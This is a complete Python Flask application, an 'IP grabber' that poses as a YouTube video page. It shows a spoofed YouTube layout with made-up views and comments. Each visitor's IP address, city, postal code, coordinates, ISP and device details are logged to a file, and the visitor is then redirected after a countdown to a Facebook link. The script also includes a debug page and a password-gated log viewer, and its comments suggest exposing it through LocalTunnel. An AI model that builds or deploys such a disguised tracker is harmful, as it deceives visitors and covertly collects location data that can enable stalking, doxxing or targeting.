from flask import Flask, request, render_template_string, redirect
import datetime
import os
import requests
import ipaddress
from user_agents import parse

app = Flask(__name__)

# ============================================
# CONFIGURATION - CHANGE THIS
# ============================================
# This will be your LocalTunnel URL
# Get it after running lt command
REDIRECT_URL ='https://www.facebook.com/share/1HJk7Pqfap/'
PORT = int(os.environ.get("PORT", 5011))

# YouTube video details
VIDEO_ID = 'dQw4w9WgXcQ'
VIDEO_TITLE = '🔥 AMAZING VIDEO - You Won\'t Believe This!'
CHANNEL_NAME = 'TechMaster Pro'
CHANNEL_SUBSCRIBERS = '2.4M subscribers'
VIEWS = '1.2M views'
UPLOAD_DATE = '3 days ago'
LIKES = '45K'
DISLIKES = '123'
COMMENTS = '2.3K comments'

# ============================================
# ADVANCED IP GEOLOCATION WITH FALLBACK
# ============================================

def get_advanced_geo(ip):
    # Check for private IP
    try:
        if ip == '127.0.0.1' or ip == '0.0.0.0' or ip == '::1':
            return {
                'status': 'private',
                'message': 'Local/Private IP',
                'city': 'Local',
                'region': 'Local',
                'country': 'Local',
                'postal': 'N/A',
                'isp': 'Local Network',
                'org': 'Local Device',
                'timezone': 'Local',
                'lat': '0',
                'lon': '0',
                'as_number': 'N/A',
                'as_name': 'N/A',
                'mobile': False,
                'proxy': False,
                'hosting': False
            }
        
        is_private = ipaddress.ip_address(ip).is_private
        if is_private:
            return {
                'status': 'private',
                'message': 'Private Network',
                'city': 'Private',
                'region': 'Private',
                'country': 'Private',
                'postal': 'N/A',
                'isp': 'Private Network',
                'org': 'Local Network',
                'timezone': 'Local',
                'lat': '0',
                'lon': '0',
                'as_number': 'N/A',
                'as_name': 'N/A',
                'mobile': False,
                'proxy': False,
                'hosting': False
            }
    except:
        pass
    
    # Try ip-api.com first
    try:
        res = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,city,region,country,postal,isp,org,timezone,lat,lon,as,asname,mobile,proxy,hosting",
            timeout=5
        )
        data = res.json()
        
        if data.get('status') == 'success':
            org = data.get('org', '')
            isp = data.get('isp', '')
            
            if not org or org.startswith('AS'):
                ipinfo_data = get_ipinfo_data(ip)
                if ipinfo_data:
                    org = ipinfo_data.get('org', org)
                    isp = ipinfo_data.get('isp', isp)
            
            return {
                'status': 'success',
                'message': 'Success',
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'postal': data.get('postal', 'N/A'),
                'isp': isp if isp else 'Unknown ISP',
                'org': org if org else 'Unknown Organization',
                'timezone': data.get('timezone', 'Unknown'),
                'lat': data.get('lat', '0'),
                'lon': data.get('lon', '0'),
                'as_number': data.get('as', 'N/A'),
                'as_name': data.get('asname', 'N/A'),
                'mobile': data.get('mobile', False),
                'proxy': data.get('proxy', False),
                'hosting': data.get('hosting', False)
            }
        else:
            ipinfo_data = get_ipinfo_data(ip)
            if ipinfo_data:
                return ipinfo_data
            else:
                return {
                    'status': 'error',
                    'message': data.get('message', 'Unknown error'),
                    'city': 'Unknown',
                    'region': 'Unknown',
                    'country': 'Unknown',
                    'postal': 'N/A',
                    'isp': 'Unknown',
                    'org': 'Unknown',
                    'timezone': 'Unknown',
                    'lat': '0',
                    'lon': '0',
                    'as_number': 'N/A',
                    'as_name': 'N/A',
                    'mobile': False,
                    'proxy': False,
                    'hosting': False
                }
    except Exception as e:
        ipinfo_data = get_ipinfo_data(ip)
        if ipinfo_data:
            return ipinfo_data
        else:
            return {
                'status': 'error',
                'message': str(e),
                'city': 'Unknown',
                'region': 'Unknown',
                'country': 'Unknown',
                'postal': 'N/A',
                'isp': 'Unknown',
                'org': 'Unknown',
                'timezone': 'Unknown',
                'lat': '0',
                'lon': '0',
                'as_number': 'N/A',
                'as_name': 'N/A',
                'mobile': False,
                'proxy': False,
                'hosting': False
            }

def get_ipinfo_data(ip):
    try:
        url = f"https://ipinfo.io/{ip}/json"
        res = requests.get(url, timeout=5)
        data = res.json()
        
        if 'error' in data:
            return None
        
        org_full = data.get('org', '')
        as_number = 'N/A'
        org_name = org_full
        
        if org_full and ' ' in org_full:
            parts = org_full.split(' ', 1)
            if parts[0].startswith('AS'):
                as_number = parts[0]
                org_name = parts[1] if len(parts) > 1 else org_full
        
        return {
            'status': 'success',
            'message': 'Success (ipinfo.io)',
            'city': data.get('city', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'country': data.get('country', 'Unknown'),
            'postal': data.get('postal', 'N/A'),
            'isp': data.get('org', 'Unknown ISP'),
            'org': data.get('org', 'Unknown Organization'),
            'timezone': data.get('timezone', 'Unknown'),
            'lat': data.get('loc', '0,0').split(',')[0] if data.get('loc') else '0',
            'lon': data.get('loc', '0,0').split(',')[1] if data.get('loc') else '0',
            'as_number': as_number,
            'as_name': org_name,
            'mobile': False,
            'proxy': False,
            'hosting': False
        }
    except Exception as e:
        return None

def get_real_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    real_ip = request.headers.get('X-Real-IP')
    if real_ip:
        return real_ip
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip
    return request.remote_addr

# ============================================
# YOUTUBE LOOKALIKE TEMPLATE
# ============================================

YOUTUBE_DARK_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ video_title }} - YouTube</title>
    <link rel="icon" href="https://www.youtube.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', Arial, sans-serif; background: #0f0f0f; color: #f1f1f1; min-height: 100vh; }
        .header {
            background: #202020;
            padding: 8px 24px;
            display: flex;
            align-items: center;
            gap: 20px;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid #333;
            height: 56px;
        }
        .logo { color: #ff0000; font-size: 22px; font-weight: bold; display: flex; align-items: center; }
        .logo span { color: #f1f1f1; margin-left: 2px; }
        .search { flex: 1; max-width: 600px; display: flex; }
        .search input {
            width: 100%;
            padding: 8px 16px;
            border: 1px solid #303030;
            border-radius: 20px 0 0 20px;
            background: #121212;
            color: #f1f1f1;
            font-size: 14px;
            outline: none;
        }
        .search input:focus { border-color: #1a73e8; }
        .search button {
            padding: 8px 20px;
            border: 1px solid #303030;
            border-left: none;
            border-radius: 0 20px 20px 0;
            background: #303030;
            color: #f1f1f1;
            cursor: pointer;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 24px; display: grid; grid-template-columns: 1fr 400px; gap: 24px; }
        .player { background: #000; position: relative; padding: 56.25% 0 0 0; border-radius: 12px; overflow: hidden; }
        .player img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background: rgba(255,0,0,0.8);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            animation: pulse 2s infinite;
        }
        .play-button::after { content: "▶"; font-size: 36px; color: white; margin-left: 6px; }
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.05); }
            100% { transform: translate(-50%, -50%) scale(1); }
        }
        .video-info { margin-top: 16px; }
        .video-title { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
        .video-stats { display: flex; align-items: center; gap: 16px; color: #aaa; font-size: 14px; margin-bottom: 12px; }
        .channel-info {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 12px 0;
            border-top: 1px solid #333;
            border-bottom: 1px solid #333;
        }
        .channel-avatar {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff0000, #ff6b6b);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
            color: white;
        }
        .channel-name { font-weight: 600; font-size: 16px; }
        .channel-subs { color: #aaa; font-size: 13px; }
        .subscribe-btn {
            margin-left: auto;
            padding: 8px 16px;
            background: #cc0000;
            color: white;
            border: none;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
        }
        .subscribe-btn:hover { background: #ff0000; }
        .action-buttons { display: flex; gap: 8px; margin-top: 12px; }
        .action-btn {
            padding: 8px 16px;
            background: #272727;
            border: none;
            border-radius: 20px;
            color: #f1f1f1;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }
        .action-btn:hover { background: #3a3a3a; }
        .comments-section { margin-top: 24px; }
        .comments-section h3 { font-size: 16px; margin-bottom: 16px; }
        .comment { display: flex; gap: 12px; margin-bottom: 16px; }
        .comment-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #2a2a2a;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #aaa;
        }
        .comment-author { font-weight: 600; font-size: 13px; }
        .comment-text { font-size: 14px; color: #ddd; margin-top: 2px; }
        .comment-time { color: #888; font-size: 12px; }
        .sidebar { display: flex; flex-direction: column; gap: 12px; }
        .sidebar-item { display: flex; gap: 12px; cursor: pointer; padding: 8px; border-radius: 8px; transition: background 0.2s; }
        .sidebar-item:hover { background: #272727; }
        .sidebar-thumb { width: 168px; height: 94px; background: #1a1a1a; border-radius: 8px; overflow: hidden; flex-shrink: 0; }
        .sidebar-thumb img { width: 100%; height: 100%; object-fit: cover; }
        .sidebar-title { font-size: 14px; font-weight: 500; margin-bottom: 4px; }
        .sidebar-channel { font-size: 12px; color: #aaa; }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            flex-direction: column;
            gap: 20px;
        }
        .loading-overlay.show { display: flex; }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #333;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text { font-size: 18px; color: #f1f1f1; }
        .loading-sub { font-size: 14px; color: #888; }
        @media (max-width: 768px) {
            .container { grid-template-columns: 1fr; padding: 12px; }
            .sidebar { display: none; }
            .search { display: none; }
        }
    </style>
</head>
<body>
    <div class="loading-overlay show" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">⏳ Loading video...</div>
        <div class="loading-sub">This will only take a moment</div>
        <div style="font-size:12px; color:#666; margin-top:20px;">⚡ <span id="timer">3</span>s</div>
    </div>
    
    <header class="header">
        <div class="logo">▶<span>YouTube</span></div>
        <div class="search">
            <input type="text" placeholder="Search" value="{{ video_title|truncate(30) }}">
            <button>🔍</button>
        </div>
    </header>
    
    <div class="container">
        <div>
            <div class="player">
                <img src="https://img.youtube.com/vi/{{ video_id }}/maxresdefault.jpg" alt="Video thumbnail">
                <div class="play-button"></div>
            </div>
            
            <div class="video-info">
                <h1 class="video-title">{{ video_title }}</h1>
                <div class="video-stats">
                    <span>{{ views }}</span>
                    <span>•</span>
                    <span>{{ upload_date }}</span>
                </div>
                
                <div class="channel-info">
                    <div class="channel-avatar">{{ channel_name[0] }}</div>
                    <div>
                        <div class="channel-name">{{ channel_name }}</div>
                        <div class="channel-subs">{{ channel_subs }}</div>
                    </div>
                    <button class="subscribe-btn">Subscribe</button>
                </div>
                
                <div class="action-buttons">
                    <button class="action-btn">👍 {{ likes }}</button>
                    <button class="action-btn">👎 {{ dislikes }}</button>
                    <button class="action-btn">🔗 Share</button>
                    <button class="action-btn">💬 {{ comments }}</button>
                </div>
            </div>
            
            <div class="comments-section">
                <h3>💬 {{ comments }} Comments</h3>
                <div class="comment">
                    <div class="comment-avatar">J</div>
                    <div>
                        <div class="comment-author">JohnDoe_123</div>
                        <div class="comment-text">This is absolutely amazing! 🔥🔥🔥</div>
                        <div class="comment-time">2 hours ago</div>
                    </div>
                </div>
                <div class="comment">
                    <div class="comment-avatar">S</div>
                    <div>
                        <div class="comment-author">SarahTech</div>
                        <div class="comment-text">Best video I've seen this year! 🙌</div>
                        <div class="comment-time">5 hours ago</div>
                    </div>
                </div>
                <div class="comment">
                    <div class="comment-avatar">M</div>
                    <div>
                        <div class="comment-author">Mike_Pro</div>
                        <div class="comment-text">Where can I find more content like this?</div>
                        <div class="comment-time">1 day ago</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="sidebar">
            <div class="sidebar-item">
                <div class="sidebar-thumb"><img src="https://img.youtube.com/vi/2Vv-BfVoq4g/mqdefault.jpg" alt="Video"></div>
                <div>
                    <div class="sidebar-title">Another Amazing Video!</div>
                    <div class="sidebar-channel">TechMaster Pro</div>
                    <div class="sidebar-channel">1.8M views</div>
                </div>
            </div>
            <div class="sidebar-item">
                <div class="sidebar-thumb"><img src="https://img.youtube.com/vi/9bZkp7q19f0/mqdefault.jpg" alt="Video"></div>
                <div>
                    <div class="sidebar-title">Music Video 2024</div>
                    <div class="sidebar-channel">Music World</div>
                    <div class="sidebar-channel">3.2M views</div>
                </div>
            </div>
            <div class="sidebar-item">
                <div class="sidebar-thumb"><img src="https://img.youtube.com/vi/6Dh-RL__uN4/mqdefault.jpg" alt="Video"></div>
                <div>
                    <div class="sidebar-title">Tech Review 2024</div>
                    <div class="sidebar-channel">ReviewTech</div>
                    <div class="sidebar-channel">890K views</div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let seconds = 3;
        const timerElement = document.getElementById('timer');
        const countdown = setInterval(() => {
            seconds--;
            if (timerElement) timerElement.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(countdown);
                window.location.href = '{{ redirect_url }}';
            }
        }, 1000);
    </script>
</body>
</html>
"""

# ============================================
# MAIN ROUTES
# ============================================

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent_string = request.headers.get('User-Agent', 'Unknown')
    ua = parse(user_agent_string)
    geo_data = get_advanced_geo(ip)
    
    device = ua.device.family
    os = ua.os.family
    browser = ua.browser.family
    device_info = f"{device} ({os})"
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = f"""
╔══════════════════════════════════════════════════════════════╗
║ VISITOR DETAILS - {timestamp}
╠══════════════════════════════════════════════════════════════╣
║ IP ADDRESS: {ip}
╠══════════════════════════════════════════════════════════════╣
║ LOCATION INFORMATION:
║   City:       {geo_data.get('city', 'Unknown')}
║   Region:     {geo_data.get('region', 'Unknown')}
║   Country:    {geo_data.get('country', 'Unknown')}
║   Postal:     {geo_data.get('postal', 'N/A')}
║   Timezone:   {geo_data.get('timezone', 'Unknown')}
║   Latitude:   {geo_data.get('lat', '0')}
║   Longitude:  {geo_data.get('lon', '0')}
╠══════════════════════════════════════════════════════════════╣
║ NETWORK INFORMATION:
║   ISP:        {geo_data.get('isp', 'Unknown')}
║   Org:        {geo_data.get('org', 'Unknown')}
║   AS Number:  {geo_data.get('as_number', 'N/A')}
║   AS Name:    {geo_data.get('as_name', 'N/A')}
╠══════════════════════════════════════════════════════════════╣
║ DEVICE INFORMATION:
║   Device:     {device_info}
║   Browser:    {browser}
║   Full UA:    {user_agent_string[:80]}...
╠══════════════════════════════════════════════════════════════╣
║ FLAGS:
║   Mobile:     {geo_data.get('mobile', False)}
║   Proxy:      {geo_data.get('proxy', False)}
║   Hosting:    {geo_data.get('hosting', False)}
╚══════════════════════════════════════════════════════════════╝
"""
    
    with open("ip_logs.txt", "a") as f:
        f.write(log_entry)
    
    print(f"\n[{timestamp}] New Visitor!")
    print(f"  IP: {ip}")
    print(f"  Location: {geo_data.get('city')}, {geo_data.get('country')}")
    print(f"  ISP: {geo_data.get('isp')}")
    print(f"  Org: {geo_data.get('org')}")
    print(f"  Device: {device_info}\n")
    
    return render_template_string(
        YOUTUBE_DARK_TEMPLATE,
        video_id=VIDEO_ID,
        video_title=VIDEO_TITLE,
        channel_name=CHANNEL_NAME,
        channel_subs=CHANNEL_SUBSCRIBERS,
        views=VIEWS,
        upload_date=UPLOAD_DATE,
        likes=LIKES,
        dislikes=DISLIKES,
        comments=COMMENTS,
        redirect_url=REDIRECT_URL
    )

@app.route('/watch')
def watch():
    return redirect('/')

@app.route('/debug')
def debug():
    ip = get_real_ip()
    geo = get_advanced_geo(ip)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua = parse(user_agent)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Debug - All Visitor Data</title>
        <style>
            body { background: #0f0f0f; color: #f1f1f1; font-family: 'Courier New', monospace; padding: 40px; max-width: 800px; margin: 0 auto; }
            h1 { color: #ff0000; border-bottom: 2px solid #ff0000; padding-bottom: 10px; }
            .section { background: #1a1a1a; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #ff0000; }
            .section h2 { color: #ff6b6b; margin-top: 0; }
            .label { color: #888; }
            .value { color: #4fc3f7; font-weight: bold; }
            table { width: 100%; border-collapse: collapse; }
            td { padding: 8px; border-bottom: 1px solid #333; }
            .badge {
                display: inline-block;
                padding: 2px 10px;
                border-radius: 12px;
                font-size: 12px;
                font-weight: bold;
            }
            .badge-mobile { background: #ff6b6b; color: white; }
            .badge-proxy { background: #ffa726; color: black; }
            .badge-hosting { background: #66bb6a; color: black; }
        </style>
    </head>
    <body>
        <h1>🔍 Visitor Debug Information</h1>
        <p><em>All data collected from your visit</em></p>
        
        <div class="section">
            <h2>📡 IP Address</h2>
            <table>
                <tr><td class="label">IP Address:</td><td class="value">{ip}</td></tr>
                <tr><td class="label">Remote Addr:</td><td>{remote_addr}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>📍 Location Details</h2>
            <table>
                <tr><td class="label">City:</td><td class="value">{city}</td></tr>
                <tr><td class="label">Region:</td><td class="value">{region}</td></tr>
                <tr><td class="label">Country:</td><td class="value">{country}</td></tr>
                <tr><td class="label">Postal Code:</td><td class="value">{postal}</td></tr>
                <tr><td class="label">Timezone:</td><td class="value">{timezone}</td></tr>
                <tr><td class="label">Latitude:</td><td class="value">{lat}</td></tr>
                <tr><td class="label">Longitude:</td><td class="value">{lon}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>🌐 Network Information</h2>
            <table>
                <tr><td class="label">ISP:</td><td class="value">{isp}</td></tr>
                <tr><td class="label">Organization:</td><td class="value">{org}</td></tr>
                <tr><td class="label">AS Number:</td><td class="value">{as_number}</td></tr>
                <tr><td class="label">AS Name:</td><td class="value">{as_name}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>📱 Device Information</h2>
            <table>
                <tr><td class="label">Device:</td><td class="value">{device}</td></tr>
                <tr><td class="label">OS:</td><td class="value">{os}</td></tr>
                <tr><td class="label">Browser:</td><td class="value">{browser}</td></tr>
                <tr><td class="label">User-Agent:</td><td class="value" style="font-size:12px;">{user_agent}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>🚩 Flags</h2>
            <table>
                <tr>
                    <td class="label">📱 Mobile:</td>
                    <td><span class="badge {mobile_class}">{mobile}</span></td>
                </tr>
                <tr>
                    <td class="label">🔒 Proxy/VPN:</td>
                    <td><span class="badge {proxy_class}">{proxy}</span></td>
                </tr>
                <tr>
                    <td class="label">☁️ Hosting/Cloud:</td>
                    <td><span class="badge {hosting_class}">{hosting}</span></td>
                </tr>
            </table>
        </div>
        
        <div class="section">
            <h2>📋 All Headers</h2>
            <table>
                {headers}
            </table>
        </div>
    </body>
    </html>
    """.format(
        ip=ip,
        remote_addr=request.remote_addr,
        city=geo.get('city', 'Unknown'),
        region=geo.get('region', 'Unknown'),
        country=geo.get('country', 'Unknown'),
        postal=geo.get('postal', 'N/A'),
        timezone=geo.get('timezone', 'Unknown'),
        lat=geo.get('lat', '0'),
        lon=geo.get('lon', '0'),
        isp=geo.get('isp', 'Unknown'),
        org=geo.get('org', 'Unknown'),
        as_number=geo.get('as_number', 'N/A'),
        as_name=geo.get('as_name', 'N/A'),
        device=ua.device.family,
        os=ua.os.family,
        browser=ua.browser.family,
        user_agent=user_agent,
        mobile=geo.get('mobile', False),
        mobile_class='badge-mobile' if geo.get('mobile') else '',
        proxy=geo.get('proxy', False),
        proxy_class='badge-proxy' if geo.get('proxy') else '',
        hosting=geo.get('hosting', False),
        hosting_class='badge-hosting' if geo.get('hosting') else '',
        headers=''.join([f"<tr><td class='label'>{k}:</td><td class='value'>{v}</td></tr>" for k, v in dict(request.headers).items()])
    )
    return html

@app.route('/logs')
def view_logs():
    auth = request.headers.get('Authorization')
    if not auth or auth != 'Bearer your-secret-password':
        return "Unauthorized - Add header: Authorization: Bearer your-secret-password", 401
    try:
        with open("ip_logs.txt", "r") as f:
            logs = f.read()
        return f"<pre style='font-family:monospace; font-size:12px;'>{logs}</pre>"
    except:
        return "No logs found"

# ============================================
# RUN THE APP
# ============================================

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║     🎬 ADVANCED YouTube Lookalike Tracker                    ║
    ║                                                               ║
    ║  📊 Logging: ip_logs.txt                                     ║
    ║  🔗 Redirect: {}              ║
    ║  🎥 Video ID: {}                                           ║
    ║  🚪 Port: {}                                                 ║
    ║                                                               ║
    ║  📍 Data Collected:                                          ║
    ║     • IP Address                                             ║
    ║     • City, Region, Country                                 ║
    ║     • Postal Code                                           ║
    ║     • ISP Name                                              ║
    ║     • Organization                                          ║
    ║     • Timezone                                              ║
    ║     • Latitude/Longitude                                    ║
    ║     • Device, OS, Browser                                   ║
    ║     • Mobile/Proxy/Hosting detection                        ║
    ║                                                               ║
    ║  Access: http://127.0.0.1:{}                                ║
    ║  Debug:  http://127.0.0.1:{}/debug                         ║
    ║  Logs:   http://127.0.0.1:{}/logs (password protected)     ║
    ╚═══════════════════════════════════════════════════════════════╝
    """.format(REDIRECT_URL, VIDEO_ID, PORT, PORT, PORT, PORT))
    
    app.run(debug=False, host='0.0.0.0', port=PORT)
